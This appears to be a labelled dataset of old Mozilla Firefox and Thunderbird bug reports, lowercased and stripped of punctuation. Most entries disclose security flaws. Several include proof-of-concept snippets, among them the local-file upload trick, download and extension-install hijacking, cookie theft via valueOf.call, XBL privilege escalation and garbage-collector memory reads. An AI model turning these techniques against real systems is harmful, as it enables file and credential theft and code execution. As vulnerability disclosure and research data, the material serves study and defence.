0017f1c4 60fcf4b7 01c41240 00000000 0017f1fc xul nsthread processnextevent fpo non-fpo conv stdcall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\xpcom\threads\nsthread.cpp 936 0017f1f4 60fceb81 01c53301 fb4dd1ec 01c1c400 xul mozilla ipc messagepump run fpo 1,4,0 conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\ipc\glue\messagepump.cpp 95 0017f22c 60fcebbc 01c41240 00000001 60f7d800 xul messageloop runhandler fpo seh conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\ipc\chromium\src\base\message_loop.cc 228 0017f24c 60fcfb59 09d95840 00000000 60fcfa37 xul messageloop run fpo non-fpo conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\ipc\chromium\src\base\message_loop.cc 202 0017f258 60fcfa37 01c1c400 09d95840 612388d7 xul nsbaseappshell run fpo 1,0,0 conv stdcall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\widget\nsbaseappshell.cpp 158 0017f264 612388d7 01c1c400 63caa5a0 0edc6300 xul nsappshell run fpo 1,0,4 conv stdcall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\widget\windows\nsappshell.cpp 257 0017f274 611683b3 09d95840 0017f4f0 0017f4d8 xul nsappstartup run fpo 1,0,0 conv stdcall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\toolkit\components\startup\nsappstartup.cpp 282 0017f460 61168550 00000001 0017f620 0017f5d8 xul xremain xre_mainrun fpo 0,117,0 conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\toolkit\xre\nsapprunner.cpp 4298 0017f47c 6116a5fc 00000000 01812ff8 0017f600 xul xremain xre_main fpo 3,2,0 conv thiscall c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\toolkit\xre\nsapprunner.cpp 4391 0017f5d8 01281675 00000001 01812ff8 0017f620 xul xre_main fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\toolkit\xre\nsapprunner.cpp 4494 0017f76c 01281312 01c1c0a0 01816ff8 ffffc000 firefox do_main fpo 1,92,0 conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\browser\app\nsbrowserapp.cpp 212 0017f810 012810dc 012824eb 012824eb 0017f86c firefox ns_internal_main fpo non-fpo conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\browser\app\nsbrowserapp.cpp 354 0017f824 0128246e 01812ff8 013cbf98 013cdf70 firefox wmain fpo 2,0,0 conv cdecl c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\toolkit\xre\nswindowswmain.cpp 138 0017f86c 76864198 7f547000 76864170 c43a910b firefox tmaincrtstartup fpo non-fpo conv cdecl f dd\vctools\crt\crtw32\startup\crt0.c 255 0017f880 77222cb1 7f547000 5941fe22 00000000 kernel32 basethreadinitthunk fpo non-fpo 0017f8c8 77222c7f ffffffff 7724e744 00000000 ntdll ldrremoveloadasdatatable 0017f8d8 00000000 012824eb 7f547000 00000000 ntdll ldrremoveloadasdatatable 0:000 lmi xul loaded module info xul module xul base address 60da0000 image name c program files\mozilla firefox\xul.dll machine type 332 i386 time stamp 56b55a4f fri feb 05 18:28:31 2016 size 25b1000 checksum 250ec9d characteristics 2122 debug data dirs type size va pointer codeview 76 1f11818 1f10618 rsds guid 38e42f42-a4d0-489d-8c1f-967beadfca64 age 2 pdb c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\obj-firefox\toolkit\library\xul.pdb 14 1f11890 1f10690 data not mapped clsid 4 1f118a4 1f106a4 data not mapped image type file image read successfully from debugger c program files\mozilla firefox\xul.dll symbol type pdb symbols loaded successfully from image path z export\symbols\xul.pdb\38e42f42a4d0489d8c1f967beadfca642\xul.pdb compiler linker front end 0.0 bld 0 back end 12.0 bld 30723 load report private symbols lines source indexed z export\symbols\xul.pdb\38e42f42a4d0489d8c1f967beadfca642\xul.pdb 0:000 lmvm xul start end module name 60da0000 63351000 xul private pdb symbols z export\symbols\xul.pdb\38e42f42a4d0489d8c1f967beadfca642\xul.pdb loaded symbol image file c program files\mozilla firefox\xul.dll image path c program files\mozilla firefox\xul.dll image name xul.dll timestamp fri feb 05 18:28:31 2016 56b55a4f checksum 0250ec9d imagesize 025b1000 file version 44.0.1.5879 product version 44.0.1.5879 file flags 0 mask 3f file os 4 unknown win32 file type 2.0 dll file date 00000000.00000000 translations 0000.04b0 companyname mozilla foundation productname firefox internalname firefox originalfilename xul.dll productversion 44.0.1 fileversion 44.0.1 filedescription 44.0.1 legalcopyright license mpl 2 legaltrademarks mozilla comments mozilla 0:000 vertarget windows 8 version 9600 up free x86 compatible product winnt suite singleuserts kernel32.dll version 6.3.9600.17415 winblue_r4.141028-1500 machine name debug session time wed feb 10 15:28:01.372 2016 utc 8:00 system uptime 0 days 0:19:13.452 process uptime 0 days 0:01:40.437 kernel time 0 days 0:00:00.578 user time 0 days 0:00:02.218 root of the bug dom/html/nshtmldocument.cpp void nshtmldocument setbody nsgenerichtmlelement newbody errorresult rv element root getrootelement the body element must be either a body tag or a frameset tag and we must have a html root tag otherwise getbody will not return the newly set body if newbody newbody isanyofhtmlelements nsgkatoms body nsgkatoms frameset root root ishtmlelement root ishtmlelement nsgkatoms html rv.throw ns_error_dom_hierarchy_request_err return use dom methods so that we pass through the appropriate security checks nscomptr element currentbody getbodyelement if currentbody root replacechild newbody currentbody rv else root appendchild newbody rv dom/base/nsinode.h nsinode appendchild nsinode anode mozilla errorresult aerror return insertbefore anode nullptr aerror nsinode insertbefore nsinode anode nsinode achild mozilla errorresult aerror return replaceorinsertbefore false anode achild aerror dom/base/nsinode.cpp nsinode nsinode replaceorinsertbefore bool areplace nsinode anewchild nsinode arefchild errorresult aerror xxxbz i wish i could assert that nscontentutils issafetorunscript so we could rely on scriptblockers going out of scope to actually run xbl teardown but various crud adds nodes under scriptblockers e.g native anonymous content the only good news is those insertions ca n't trigger the bad xbl cases moz_assert_if areplace arefchild ensurepreinsertionvalidity1 anewchild arefchild aerror if aerror.failed return nullptr uint16_t nodetype anewchild nodetype before we do anything else fire all domnoderemoved mutation events we do this up front as to avoid having to deal with script running at random places further down scope firing mutation events so that we do n't carry any state that might be stale this check happens again further down though then using indexof we re only checking this here to avoid firing mutation events when none should be fired it s ok that we do the check twice in the case when firing mutation events as we need to recheck after running script anyway if arefchild arefchild getparentnode this aerror.throw ns_error_dom_not_found_err return nullptr if we re replacing fire for node-to-be-replaced if arefchild anewchild then we ll fire for it in check below if areplace arefchild anewchild nscontentutils maybefirenoderemoved arefchild this ownerdoc if the new node already has a parent fire for removing from old parent nsinode oldparent anewchild getparentnode if oldparent nscontentutils maybefirenoderemoved anewchild oldparent anewchild ownerdoc if we re inserting a fragment fire for all the children of the fragment if nodetype nsidomnode document_fragment_node static_cast fragmentorelement anewchild firenoderemovedforchildren verify that our arefchild is still sensible if arefchild arefchild getparentnode this aerror.throw ns_error_dom_not_found_err return nullptr ensurepreinsertionvalidity2 areplace anewchild arefchild aerror credit this vulnerability was discovered by lokihardt working with hp s zero day initiative	11
thunderbird tries to download nonexisting messages with pop3 user-agent mozilla/4.0 compatible msie 6.0 windows nt 5.1 net clr 1.1.4322 build identifier mozilla tunderbird 0.4a 20031119 i m using a small pop3 proxy which scans my incoming mail headers and deletes spam directly on the server however if i try to get my mail using thunderbird over my proxy it always fails i get an err message is deleted response from the server thunderbird correctly sends list and uidl to the server my proxy did already delete some messages so that they are n't included in the response to list/uidl anymore example message with index 2 has been deleted uidl ok mailbox has 2 messages 23612 octets 1 4dc74a92bfa4d7s8 3 613d71dfdc905ee0 the next thing thunderbird does is to retrieve the mails with the uids it does n't know yet the problem is that thunderbird also sends a retr 2 command which fails i could think of the following reasons for this bug thunderbird does not correctly parse the output of list/uidl the internal uid list does not get initialized properly no uid for mail with index 2 received 0 or random data as uid thunderbird tries to download messages with 0 uids in case the internal uid list gets zero-initialized i ve tested the win32 build of mozilla tunderbird 0.4a 20031119 reproducible always steps to reproduce i ve been redirected to bugzilla the original report can be found here 274792	11
internal nspop3protocol.cpp back out fix for bug 157644 since david has fixed the problem another way bug 229374 internal nspop3protocol.cpp back out fix for bug 157644 since david has fixed the problem another way bug 229374 nspop3protocol.cpp	11
non-ascii char in url lead to heap overrun the sbb faq says however as a special exception we will also consider paying rewards for bugs found in the most recent releases from designated stable branches e.g from the mozilla 1.7 branch after 1.8 is released if the bugs are not present in the most recent version but were never recognized and fixed as security bugs so i thought you would be interested to know about bugs that were fixed as standard bugs but which are actually critical security bugs so i investigated some reported mozilla crashes and actually found something very interesting in bug 254671 after some hours spent in finding the actual cause of the bug and finding that it is exploitable i realised the bug has been discussed and should have been fixed in bug 250900 so i am not going to give detailed technical details about the bug you can see the discussion there this bug has a very critical security impact which has been missed by mozilla developpers here is the reason why put a non-ascii character in a long hostname in an url ex èaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa the utf8 conversion of the hostname is called and fails but returns a success error code so the variable approxlen is incremented by 0 instead of strlen mhost this is the bug a buffer is allocated with length approxlen 32 which is too short then mhost is copied into this buffer buffer overflow on the heap with arbitrary data supplied in the hostname by the attacker the bug exists on mozilla 1.7.2 linux and windows at least in the version i downloaded from your website 10 days ago i verified that on windows systems the bug leads to mov eax ecx where we control eax and ecx which is the common situation in exploitable heap overflows i think all oses are vulnerable and that this bug can be exploited when viewing a website or when clicking on a link in an email cheers gael delalleau	11
heap overflows triggered by send page user-agent mozilla/5.0 x11 u linux i686 en-us rv:1.6 gecko/20040115 build identifier mozilla/5.0 there are heap based buffer overflows triggered by send page and then sending the email the overflow is at least in 1.7 and nightly from 3.sep the fucked code is in nsmsgcomputils.cpp mime_generate_attachment_headers one of the overflows is triggered by if s push_string 20 one char consumes 3 bytes of memory while only 2 are allocated to reproduce try to send as page data text/html a_lot_of_spaces the other buffer overflow is triggered by sending long http urls containing not clear which code fucks it btw the macro push_string is quite unsafe and i suggest it checks whether there is enough space left reproducible always steps to reproduce will attach testcases actual results the heap is fucked up expected results the heap is not fucked up	11
wrong file permissions after installation user-agent mozilla/5.0 x11 u linux i686 en-us rv:1.6 gecko/20040113 build identifier mozilla/5.0 x11 u linux i686 en-us rv:1.6 gecko/20040113 after installation many installed files are group and world writable even though the installer was run with the umask value 0022 reproducible always steps to reproduce 1 2 3	2
xpinstall ignores user s umask when installing files when files are installed via xpinstall the user s umask is ignored the xpinstall engine should respect the user s umask setting the problem code is here nsziparchive extractfile 641 nsjar extract 251 both open the file with 0644 perms and then chmod the file to the appropriate perms but this sidesteps any umask just to make things more complicated the nsziparchive is part of standalone libjar where pr_open is defined as fopen in zipstub.h so passing the file s mode to pr_open would n't work in that situation this bug contributed to problems in bug 231083	2
fix xbl load missing content policy check thunderbird not blocking remote content user-agent mozilla/5.0 windows u windows nt 5.1 en-us rv:1.7.7 gecko/20050414 build identifier mozilla/5.0 windows u windows nt 5.1 en-us rv:1.7.6 gecko/20050317 thunderbird/1.0.2 thunderbird does n't block remote xbl even though block loading of remote images setting is true reproducible always steps to reproduce create the following html mail and receive it and open it body p if the remote xbl is loaded a red box appears below p p style moz-binding url x p body is xml version 1.0 bindings xmlns xmlns xul binding id x content xul label value this is the remote xbl content style background-color f00 content binding bindings actual results the remote xbl is loaded expected results the remote xbl is blocked	2
content xbl scripts run even when javascript turned off thunderbird exposed to any js exploit user-agent mozilla/5.0 windows u windows nt 5.1 en-us rv:1.7.7 gecko/20050414 build identifier mozilla/5.0 windows u windows nt 5.1 en-us rv:1.7.6 gecko/20050317 thunderbird/1.0.2 1 disabling javascript does n't stop the xbl version of bug 289074 and bug 289083 bug 289074 comment 89 2 thunderbird does n't block remote xbl even though block loading of remote images setting is true bug 292589 thus thunderbird is exploitable by default affected windows u windows nt 5.1 en-us rv:1.7.6 gecko/20050317 thunderbird/1.0.2 windows u windows nt 5.1 en-us rv:1.8b2 gecko/20050501 thunderbird/1.0 not affected windows u windows nt 5.1 en-us rv:1.7.8 gecko/20050501 thunderbird/1.0.4 reproducible always steps to reproduce create the following html mail and receive it and open it body p if the remote xbl is loaded a red box appears below p p style moz-binding url x p body is xml version 1.0 bindings xmlns xmlns xul binding id x content xul vbox style border solid 2px f00 xul label value this is the remote xbl content xul label value left-click or right-click or middle-click on me xul vbox content implementation property name localname getter cdata it needs chrome privilege to get components.stack var code alert exploit n\\n components.stack p var s new string p s.tolowercase new script code return s getter property implementation binding bindings	2
cve-2006-0297 probably an integer overflow in jsxml.c user-agent mozilla/5.0 x11 u linux i686 en-us rv:1.8 gecko/20051111 firefox/1.5 build identifier mozilla/5.0 x11 u linux i686 en-us rv:1.8 gecko/20051111 firefox/1.5 in jsxml.c:2351 escapeattributevalue if c newlength 5 else if c newlength 3 else if c c n c r c t newlength 4 this seems somewhat suspicous because of int too big problem probably after multiplication with sizeof jschar some empirical evidence suggests segv in free after hitting this code though the exact codepath is not determined yet exploitability will be determined later debug builds die from abort but 1.5 release crashes in free testcase to follow program received signal sigsegv segmentation fault switching to thread 1220606272 lwp 16742 in free from lib/tls/libc.so.6 0 in free from lib/tls/libc.so.6 1 in js_reportcompileerrornumberuc from opt/firefox15/libmozjs.so 2 in js_finishstringbuffer from opt/firefox15/libmozjs.so 3 in js_isxmlname from opt/firefox15/libmozjs.so 4 in js_isxmlname from opt/firefox15/libmozjs.so 5 in js_isxmlname from opt/firefox15/libmozjs.so 6 in js_invoke from opt/firefox15/libmozjs.so 7 in js_interpret from opt/firefox15/libmozjs.so 8 in js_execute from opt/firefox15/libmozjs.so 9 in js_evaluateucscriptforprincipals from opt/firefox15/libmozjs.so gdb x/i eip free+73 mov ecx eax gdb p/x eax 1 gdb p/x ecx 2 reproducible always steps to reproduce testcase actual results crash in free expected results crash free	11
cve-2006-0297 integer overflow in nssvgcairosurface init and nscanvasrenderingcontext2d in nssvgcairosurface init mdata new pruint8 4 width height this may overflow due to int too big potential exploit may be making a hole lower on the heap with as much memory above it mdata gets there placing c objects in the upper heap then a race from another thread uses the fecked data not sure though same construct nscanvasrenderingcontext2d.cpp nsautoarrayptr pruint8 tmpbuf new pruint8 asurfacesize.width asurfacesize.height 4 testcase to follow	11
firefox more precisely the gecko engine crashed by the scanit browser crash test sinkcontext begin user-agent mozilla/5.0 windows u win 9x 4.90 en-us rv:1.7.5 gecko/20041107 firefox/1.0 build identifier mozilla/5.0 windows u win 9x 4.90 en-us rv:1.7.5 gecko/20041107 firefox/1.0 i tested firefox 1.0 on the following browser crash test from scanit it is based on mangleme by michal zalewski firefox handled the broken pages for a while then crashed i attached the crash inducing html file reproducible always steps to reproduce	11
mozilla firefox tag order vulnerability zdi-06-009 cve-2006-0749 zdi-can-008 mozilla firefox tag order vulnerability abstract there exists a remotely exploitable code execution vulnerability mozilla firefox related to the order tags appear in an html document this can be exploited by any website offering html content verified on firefox 1.0.7 for windows xp sp2 assumed vulnerabled on all versions of firefox for windows vulnerability details when certain tags appear in order an exploitable memory corruption condition occurs in firefox allowing an attacker to arbitrarily control the instruction flow an example tag pattern table xxx th frameset param map p table xxx in the above snippet xxx may be replaced with any arbitrary data and the bug will still take place furthermore certain tags such as the p tag can be replaced with other tags tag attributes do not appear to affect the issue either to reproduce the issue try embedding a file containing the above snippet within an iframe of another page the issue is manifested at the following instructions within firefox.exe 005b249d mov ecx dword ptr ds eax 005b249f call dword ptr ds ecx+4 it is possible to control the eax value which is read off of the stack through multiple calls to the javascript document.write routine function document.write value and then opening the exploiting html in an iframe the relevant vulnerable code within firefox may be found at content/html/document/src/nshtmlcontentsink.cpp:1151 ns_addref aroot aroot is not initialised and ns_addref is defined so define ns_addref ptr ptr addref credit this vulnerability was discovered by an anonymous zdi researcher	11
fix js exploit via print preview if a user is tricked to select print preview twice the first time a blank page is shown it is possible to at least change his preferences the problem is execution of js coming from xbl in print preview and probably a race condition helped by alert s some trunk versions crash some get exploited had a hard time avoiding the crashes testcase to follow	2
print preview continues to cause trouble allowing chrome privilege print preview continues to cause trouble allowing chrome privilege print preview continues to cause trouble via xbl and xul iframe not quite sure whether xbl is needed works with javascript disabled testcase to follow	2
fix site can cause user s file to be uploaded by changing input type user-agent mozilla/5.0 windows u windows nt 5.1 da rv:1.8.0.1 gecko/20060111 firefox/1.5.0.1 build identifier mozilla/5.0 windows u windows nt 5.1 da rv:1.8.0.1 gecko/20060111 firefox/1.5.0.1 if you make a file called 1.txt and place it on c on a windows machine and then try the url the file will be uploaded without your approval this is indeed a high risc security issue if you do n't want to enter the url the js code is this function changetype obj obj.type text obj.value c 1.txt obj.type file settimeout videre 1 function videre document.getelementbyid submit click reproducible always steps to reproduce 1 make a page and run the javascript and make as an example php show the output actual results file gets uploaded and content is printed expected results denied the change of the input to file	9
can steal upload files by changing input type to file during domnodeinserted mutation event for a demo see password manager does something like this 1 make sure the username field has type text 2 make sure the password field has type password 3 fill in the username field 4 fill in the password field during a domnodeinserted event triggered by step 3 or even during a domnodeinserted event triggered by step 4 see below i can change the password field into a file upload control and steal the file whose path name is your password exploiting this requires getting a user to save a password of your choice that is n't hard an attacker could either a convince a user to save some password with the filename in a hidden password field or b use a bug 162020-like trick on the save password dialog there are arguably several things wrong here 1 the web page gets a domnodeinserted event when the username is filled the originaltarget of the event is a text node in the textbox s editor an implementation detail that web pages should never see 2 perhaps password manager should re-verify that the password field is really a password field just before filling it in 3 if you change the type of the password field during the domnodeinserted event for the password field rather than the username field the exploit still works so fixing 2 alone would n't close off the hole i think this is because nshtmlinputelement setvalueinternal ensures it is n't a file upload control then does stuff to its editor then changes its internal value 4 mutation events allow web site scripts to execute at unexpected times which makes it really hard to write correct code maybe we should n't support them	9
15.3.4.4 function.prototype.call should use global object as scope when no thisarg is passed from brendan 15.3.4.4 function.prototype.call thisarg arg1 arg2 the call method takes one or more arguments thisarg and optionally arg1 arg2 etc and performs a function call using the call property of the object if the object does not have a call property a typeerror exception is thrown the called function is passed arg1 arg2 etc as the arguments if thisarg is null or undefined the called function is passed the global object as the this value otherwise the called function is passed toobject thisarg as the this value the length property of the call method is 1 in a normal function call non object method the arguments.callee.__parent object will point to the global object however if you create a function closure its arguments.callee.__parent object will point to its call object rather than the global object	9
xss by using valueof.call or valueof.apply fx 1.0.x and suite 1.7.x are affected fx 1.5 and trunk are not affected on fx 1.0.x and suite 1.7.x when calling obj.valueof.call or obj.valueof.apply without argument return value is valueof s parent that is object.prototype on fx 1.5 and trunk return value is global object since bug 290488 was fixed there are ways to access other site s object e.g otherwin.focus otherwin.history thus an attacker can access other site s object.prototype e.g otherwin.focus.valueof.call for example an attacker could hijack software download process on a trusted site exploitable page script function download script a href onclick return download download now a attacker w open exploitable page o w.focus.valueof.call o.download function w.location malicious_exe_url return false an attacker could hijack extension install process on a href onclick return install event extension name images/default.png install now a attacker w open exploitable page o w.focus.valueof.call o.install function install aevent extname iconurl var params new array params extname url malicious_extension_url iconurl iconurl tostring function return this.url installtrigger.install params return false an attacker could run script in the context of other site exploitable page a href javascript void 0 onclick alert location aaa a attacker w open exploitable page o w.focus.valueof.call o.alert o.eval o.location malicious_code e.g steal cookie	9
content can access xbl compilation scope by using xbl.method.valueof.call or xbl.method.valueof.apply user-agent mozilla/5.0 windows u windows nt 5.1 en-us rv:1.7.12 gecko/20050915 build identifier mozilla/5.0 windows u windows nt 5.1 en-us rv:1.9a1 gecko/20051017 firefox/1.6a1 content can access xbl compilation scope by using xbl.method.valueof.call or xbl.method.valueof.apply and can create a privileged function by using function constructor in the xbl compilation scope trunk 20051017 and fx 1.0.7 and suite 1.7.12 are vulnerable marquee id m marquee marquee m document.getelementbyid m x m.init.valueof.call null or apply null y m.init.valueof.call or apply on trunk x is object nsxblprototypescript compilation scope y is object nsxblprototypescript compilation scope on 1.0.x x is object nsxblprototypescript compilation scope y is object object x.function can be used to create a privileged function on trunk and 1.0.x when m.init.valueof.call is called m.init.valueof s parent chain is used to find an object that should be used as this object if this parameter is not passed or this parameter is null or undefined m.init.valueof.__parent is object object m.init.valueof.__parent__.__parent is object nsxblprototypescript compilation scope on trunk and 1.0.x m.init.valueof.call null returns m.init.valueof.__parent__.__parent 461 461 js_computethis jscontext cx jsobject thisp jsstackframe fp 492 if jsval_is_primitive fp argv 2 493 parent obj_get_parent cx jsval_to_object fp argv 2 494 thisp cx globalobject 495 else 496 walk up to find the top-level object 497 thisp parent 498 while parent obj_get_parent cx thisp null 499 thisp parent 500 on trunk m.init.valueof.call returns m.init.valueof.__parent__.__parent 1456 1456 fun_call jscontext cx jsobject obj uintn argc jsval argv jsval rval 1477 if argc 0 1478 call fun with its global object as the this param if no args 1479 while tmp obj_get_parent cx obj null 1480 obj tmp 1481 else on 1.0.x m.init.valueof.call returns m.init.valueof.__parent 1437 1437 fun_call jscontext cx jsobject obj uintn argc jsval argv jsval rval 1457 if argc 0 1458 call fun with its parent as the this parameter if no args 1459 obj obj_get_parent cx obj 1460 else reproducible always steps to reproduce	9
access checks in xbl compilation scope can be circumvented the fix for bug 312871 can be circumvented i ve tested on trunk 2005-10-20-07 content can access objects in xbl compilation scope via a object that has xbl compilation scope object in its proto chain marquee id m marquee marquee m document.getelementbyid m x m.init.valueof.call null y proto x y.function	9
dom object can be used to circumvent security checks dom object wrapper can be used to circumvent security check for the constructor property	9
getting clone-parent of js function using watchpoint eval can be used to get clone-parent of js function see the testcase	11
getting clone-parent of js function using array generic methods array generic methods can be used to get clone-parent of js function function getcloneparent clonedfunction var fakeobject valueof function return clonedfunction var fakearray 0 cloneparent try fakearray.__definegetter 0 function cloneparent arguments.callee.caller.arguments 0 throw 0 prevent to call the iterator function fakearray.foreach fakeobject catch e return cloneparent	11
chrome xbl method.eval.call exposes privileged function constructor you can retrieve the function constructor from xbl compilation scope by boundelement.xblmethod.eval.call null function retrieved constructor can be used to execute arbitrary code with elevated privileges if xblmethod is defined in the chrome xbl file	9
chrome xbl method.eval onerror handler allows arbitary code execution you can use onerror event handler to circumvent eval s principal checks and can execute arbitary code with elevated privilege see the testcase	9
chrome xbl method.eval settimeout allows arbitary code execution you can use settimeout to circumvent eval s principal checks and can execute arbitary code with elevated privilege this one can exploit 1.0.x versions too probably be fixed by bug 311403	9
unrooted pivot in js_heapsort js_heapsort does not gc-root its pivot element thus if gc would be triggered during swap of elements in heapsorthelper from jsarray.c while pivot holding value temporarily taken out from the array as a part of element swap and that value refers to gc-thing then the sorted array would contain a pointer to a memory area gc considers free i am not sure if this is exploitable but it definitely allows to manipulate gc free list if one can trigger that gc in the middle of swap to play it safe i mark the bug as a security problem	11
unrooted access in array.prototype methods here is unrooted object access found in array.prototype implementation in jsarray.c 1 array_slice does not root the array for slice results with trivial demonstration of segmentation fault in jsshell function index_getter gc return 100 var a 0 1 a.__definegetter 0 index_getter uneval a.slice 0 1 to make this to crash the browser just replace gc by for var i 0 i 1 15 i new object 2 array_reverse does not root v and v2 indexes that it use to hold reversing values here is an example for jsshell that demonstrates how to expose 64 bits that holds jsstring value into a script variable var subverted 0 function index_getter delete a 0 gc for var i 0 i 1 14 i var tmp new string test tmp null return 1 function index_setter value subverted value var a math.sqrt 2 0 a.__definegetter 1 index_getter a.__definesetter 1 index_setter a.reverse print subverted on my linux box it prints 1.3303688272434068e-266 which is assembled from jsstring bits for new string test interpreted as double value in a similar way one can make a gc thing that js considers to be jsstring from arbitrary double value which could potentially allow to read arbitrary memory context into scripts variables via this pseudo-string due to this potential exposure i mark this bug as security-restricted	11
access of gc-ed object in array.prototype.tosource array_join_sub from jsarray.c uses unrooted jsval to hold a value of array element to apply recursive tosource to the element later in the code a specially crafted script can take advantage of it to gc the element before it is passed as this variable to js_internalcall it would allow the script to replace on a 32 platform 8 bytes of jsobect that the unrooted jsval points to by 8 bytes from chosen double value this is not as bad compared with other reported unrooted access bugs since this does not allow to subvert double reference to point to other objects to learn their addresses through double value bits still theoretically on platforms were the system heap is not randomized one can try to preallocate many strings where string body when interpreted as jsobjectmap would allow for jsobjectmap ops someoperation to be successfully executed then one learn the address this strings will most likely occupy on a particular platform use that address to build custom double value and replace via exploit jsobject map to point to that expected address but i have no idea how feasible it would be	11
unrooted strings in jsstr.c the following functions in jsstr.c do not root the results of js_valuetostring before calling gc-triggering operations str_substring str_decodeuri str_decodeuri_component str_encodeuri str_encodeuri_component the encode/decode cases is only exploitable if one can create a situation when gc is triggered in js_newstring that is called later in decode/encode after the return from js_valuetostring the case of str_substring is trivially exploitable to read arbitrary region in address space via jsstring double subversion like the following example demonstrates obj tostring function return test substr 1 4 var tmp 1e200 likezero valueof function if typeof gc function gc for var i 0 i 40000 i var tmp 2 tmp tmp null return 0 var expected test var actual string.prototype.substr.call obj likezero print substring length actual.length print expected actual on my box executing it gives in js shell before 3690 after 3654 break 08a40000 substring length 357496748 segmentation fault where 357496748 comes from 1e-200 interpreted as jsstring	11
unrooted access in jsnum.c num_parseint from jsnum.c does not root str the result of js_valuetostring applied to the first argument before calling js_valuetoecmaint32 on the second argument and using str later the following example exposes the bug var prepared_string string 1 string 2 to remove prepared_string from newborn var likestring tostring function var tmp prepared_string prepared_string null return tmp var likenumber valueof function gc return 10 var expected 1 var actual parseint likestring likenumber print expected expected actual actual	11
unrooted access to prototype property js_interpret in jsinterp.c stores the result of accessing prototype property of function objects in unrooted rval local variable this is gc-unsafe since there is object allocation before the result of accessing prototype property is rooted if one recompiles js shell with too_much_gc defined then the following example gives segmentation fault function f var prepared new object f.prototype f.__definegetter prototype function var tmp prepared prepared null return tmp new f there is a similar pattern is 2 places in jsobj.c with problematic access of prototype property i suspect that there is a problem in fun_resolve from jsfun.c as well but it may be actually gc-safe on the other hand accessing the property in exception from jsexn.c is gc safe since a script can not define a getter for prototype for error object as it already defined as read-only property	11
unrooted access in js_fun_tostring js_fun_tostring from jsfun.x does not root the result of convert call before calling on the supplied argument js_valuetoecmauint32 and using the unrooted value later the following code demonstrates the bug with a segmentation fault in js shell var f function return 1 function return 2 var expected_string f.tosource 0 var likefunction valueof function var tmp f f null return tmp proto function.prototype var likenumber valueof function gc return 0 var actual likefunction.tosource likenumber print expected_string actual	11
scripts can nullify explicit local roots by setting caller.arguments n some explicit local roots are available to scripts through caller.arguments n see bug 313370 comment 8 furthermore scripts can modify caller.arguments n nullifying such a local root the resulting lack of a local root creates the potential for a security hole see bug 311497 comment 10	11
extra rootless creatures in jsarray.c here is another unrooted access bug in jsarray.c array_unshift contains the pattern if obj_get_property cx obj id v return js_false if indextoid cx last argc id2 return js_false if obj_set_property cx obj id2 v return js_false if last argc exceeds jsval_int_max indextoid would gc allocate string for the index thus if v holds unrooted value after obj_get_property and that allocation would trigger gc then obj_set_property would store gc-collected value the example bellow demonstrates the bug in jsshell compiled with too_much_gc on my box it gives segmentation fault on the last expected actual compare operation the same pattern present in jsarray.c also exists in array_splice array_concat array_slice array_extra but in this case a bug demo would have to loop through array holes until jsval_int_max which would be a log story var n var array array n array n 1 1 array n 2 2 set getter not to wait untill engine loops through 2^31 holes in the array var loop_terminator stop_long_loop array.__definegetter n 2 function throw stop_long_loop var prepared_string string 1 array.__definegetter n 1 function var tmp prepared_string prepared_string null return tmp try array.unshift 1 catch e if e loop_terminator throw e var expected 1 var actual array n print expected actual	11
unrooted access in jsscript.c script_compile in jsscript.c does not root str the result of js_valuetoobject applied to the first argument before calling js_valuetoobject on the second and using str later the following standard demo shows the bug in the shell/browser var str 2 substring 1 1 substring 2 var expected script.prototype.compile str tosource var likestring tostring function var tmp str str null return tmp two 2.0 var likeobject valueof function if typeof gc function gc for var i 0 i 40000 i var tmp 1e100 two return this var s script.prototype.compile likestring likeobject var actual s.tosource print expected actual	11
gc hazard in js_constructobject from jsobj.c js_constructobject in jsobj.c contain the following code if js_findconstructor cx parent clasp name cval return null if proto if obj_get_property cx ctor atom_to_jsid cx runtime atomstate classprototypeatom rval return null if jsval_is_object rval proto jsval_to_object rval obj js_newobject cx clasp proto parent if obj return null if js_internalconstruct cx obj cval argc argv rval goto bad this can lead to a gc-unrooted access if the following scenario can be realized 1 script redefine an object or array constructor with one that defines a getter for for prototype 2 the getter tries hard to remove the original ctor from object graph so when obj_get_property returns ctor becomes unrooted 3 js_newobject triggers gc that collects ctor causing access to freed memory in js_internalconstruct at this time i can not prove that this is realizable with a script and in fact can be wrong especially given that it is 23:30 in norway but it is bette to be 100 sure	11
content injection spoofing with a space before colon in http header user-agent mozilla/5.0 macintosh u ppc mac os x mach-o en-us rv:1.8.0.1 gecko/20060111 firefox/1.5.0.1 build identifier n/a note this bug was originally reported to ipa information-technology promotion agency japan and forwarded to us at mozilla japan i m not original reporter do n't mention my name in the security advisory for more information about ipa visit ipa 62734622 attackers can forge a web page on another domain by sending the http response including transfer-encoding header with a space between header name and colon this could be used for the real phishing to steal sensitive data such as user password or cookies windows xp professional sp2 mozilla/5.0 windows u windows nt 5.1 en-us rv:1.9a1 gecko/20060129 firefox/1.6a1 reproducible sometimes steps to reproduce 1 set up firefox to use microsoft internet security acceleration server 2004 isa server for http proxy 2 provide the proxy with http response with the following conditions a content-length header is included b transfer-encoding chunked is included note a space between encoding and c response length with chunk size data of b is shorter than the value of a actual results transfer-encoding sp header transfer-encoding header with a space is not defined by http/1.1 therefore isa server will send data of the number of bytes specified by content-length header to the browser transfer-encoding header with a space will be transferred as is this is appropriate behavior compliant with http/1.1 received the response via proxy firefox recognizes transfer-encoding sp header as transfer-encoding header and understands that the response body is chunked encoded the rest of response determined by the condition c is incorrectly recognized as the response of following http request expected results the rest of response should not be recognized as the response of following http request the malicious web site admins can target firefox users who use htt/1.1 proxy to steal cookies or build web pages including fake login form for arbitrary domains workaround do n't use isa server more info coming	11
